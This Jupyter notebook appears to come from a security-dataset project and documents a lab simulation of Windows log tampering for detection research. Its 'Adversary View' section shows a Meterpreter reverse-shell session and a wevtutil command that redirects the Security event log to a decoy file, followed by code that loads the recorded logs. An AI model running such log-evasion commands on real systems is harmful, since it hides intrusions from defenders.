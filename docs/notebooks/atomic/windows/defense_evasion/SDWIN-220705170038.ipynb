{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "eda0a748",
   "metadata": {},
   "source": [
    "# Modifying Security Event Log File Path via Modification of Log Configuration"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7616f76f",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d4e4f33b",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/07/05 |\n",
    "| Modification Date | 2022/07/05 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | wevtutil,cmd,microsoft windows security auditing |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77a0def3",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting a shell with elevated privileges on the target, we used wevtutil.exe to modify the configuration of the Security event log. Event logs for Microsoft Windows Security Auditing are stored in a different file (Not-Important-Log.evtx) by changing the standard log path C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx. This dataset was generated using a Windows 10 Enterprise Evaluation edition (Version:21H1,OS Build:19043.1766) and Kali Linux (Version:2021.3)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8899c5e4",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c0b8c49b",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_wevtutil_modify_security_eventlog_path.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_wevtutil_modify_security_eventlog_path.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2d1114d2",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f810f9e",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "27d3649d",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | cmd | [cmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4fbc56c5",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf6 exploit(multi/handler) > run\n",
    "\n",
    "[*] Started HTTPS reverse handler on https://10.0.10.104:8443\n",
    "[*] https://10.0.10.104:8443 handling request from 10.0.10.102; (UUID: if81stxw) Staging x64 payload (201308 bytes) ...\n",
    "[*] Meterpreter session 2 opened (10.0.10.104:8443 -> 127.0.0.1) at 2022-07-05 17:00:38 -0400\n",
    "\n",
    "meterpreter > shell\n",
    "Process 1912 created.\n",
    "Channel 1 created.\n",
    "Microsoft Windows [Version 10.0.19043.1766]\n",
    "(c) Microsoft Corporation. All rights reserved.\n",
    "\n",
    "C:\\Users\\pedro\\Downloads>wevtutil get-log Security\n",
    "wevtutil get-log Security\n",
    "name: Security\n",
    "enabled: true\n",
    "type: Admin\n",
    "owningPublisher: \n",
    "isolation: Custom\n",
    "channelAccess: O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)\n",
    "logging:\n",
    "  logFileName: %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx\n",
    "  retention: false\n",
    "  autoBackup: false\n",
    "  maxSize: 1000000000\n",
    "publishing:\n",
    "  fileMax: 1\n",
    "\n",
    "C:\\Users\\pedro\\Downloads>wevtutil set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\"\n",
    "wevtutil set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\"\n",
    "\n",
    "C:\\Users\\pedro\\Downloads>wevtutil get-log Security\n",
    "wevtutil get-log Security\n",
    "name: Security\n",
    "enabled: true\n",
    "type: Admin\n",
    "owningPublisher: \n",
    "isolation: Custom\n",
    "channelAccess: O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)\n",
    "logging:\n",
    "  logFileName: C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\n",
    "  retention: false\n",
    "  autoBackup: false\n",
    "  maxSize: 1000000000\n",
    "publishing:\n",
    "  fileMax: 1\n",
    "\n",
    "C:\\Users\\pedro\\Downloads>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e8b4003f",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b37b412e",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39ea1884",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_wevtutil_modify_security_eventlog_path.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae03952c",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1526d4ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c5a84cb",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3065dcf4",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13fa5ead",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
